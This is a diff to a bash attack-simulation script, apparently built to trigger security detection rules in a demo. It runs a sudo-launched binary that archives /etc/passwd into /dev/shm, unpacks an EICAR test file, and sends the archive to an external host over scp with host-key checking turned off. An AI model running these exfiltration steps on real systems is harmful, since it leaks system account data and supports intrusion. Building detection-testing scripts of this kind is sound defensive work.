@@ -15,7 +15,7 @@ trap err_report ERR
 
 
 # Load shared variables from .env
-# This expects the .env file to be in the scripts/ directory (one level up)
+# This expects the .env file to be in the attacks/ directory (one level up)
 # ***************************************************
 # !!!  DO NOT MAKE VARIABLE CHANGES HERE   !!!      *
 # !!!  MAKE VARIABLE CHANGES IN .env       !!!      *
@@ -24,11 +24,12 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 source "$SCRIPT_DIR/../.env"
 
 # List of required variables
+FILE='/dev/shm/totally_not_exfil_linux.zip'
+
 required_vars=(
   TARGET_HOST_ROOTDIR
-  EXFILL_SSH_KEY
+  EXFILL_LINUX_SSH_KEY
   EXFILL_TARGET
-  FILE
 )
 
 # Check each one
@@ -66,7 +67,7 @@ printf '\033[1;32mDone\033[0m\n'
 
 # Copy C programs over and execute
 /bin/echo -n "Copying binaries over and executing..."
-/usr/bin/cp -p $TARGET_HOST_ROOTDIR/files/demo_progs.tar /dev/shm/ &>/dev/null
+/usr/bin/cp -p $TARGET_HOST_ROOTDIR/attacks/linux/files/demo_progs.tar /dev/shm/ &>/dev/null
 /usr/bin/tar xf /dev/shm/demo_progs.tar -C /dev/shm/ &>/dev/null
 sudo /dev/shm/nothing_to_see_here -c "/usr/bin/tar czPf $FILE /etc/passwd" &>/dev/null
 printf '\033[1;32mDone\033[0m\n'
@@ -78,7 +79,7 @@ printf '\033[1;32mDone\033[0m\n'
 
 # Trigger Malware alert with EICAR file
 /bin/echo -n "Triggering Malware alert with EICAR file..."
-/usr/bin/tar xf $TARGET_HOST_ROOTDIR/files/eicar_com.tar.gz &>/dev/null
+/usr/bin/tar xf $TARGET_HOST_ROOTDIR/attacks/linux/files/eicar_com.tar.gz &>/dev/null
 printf '\033[1;32mDone\033[0m\n'
 
 # Trigger Linux system info discovery rule
@@ -96,7 +97,8 @@ printf '\033[1;32mDone\033[0m\n'
 
 if [ -f "$FILE" ]; then
   /bin/echo -n "Copying $FILE to $EXFILL_TARGET..."
-  /usr/bin/scp -i $EXFILL_SSH_KEY $FILE $EXFILL_SSH_USER@$EXFILL_TARGET:~/  
+  /usr/bin/ssh -i $EXFILL_LINUX_SSH_KEY -o StrictHostKeyChecking=no $EXFILL_SSH_USER@$EXFILL_TARGET "mkdir -p ~/es-security-demo"
+  /usr/bin/scp -i $EXFILL_LINUX_SSH_KEY $FILE $EXFILL_SSH_USER@$EXFILL_TARGET:~/es-security-demo/
 fi
 printf '\033[1;32mDone\033[0m\n'
 
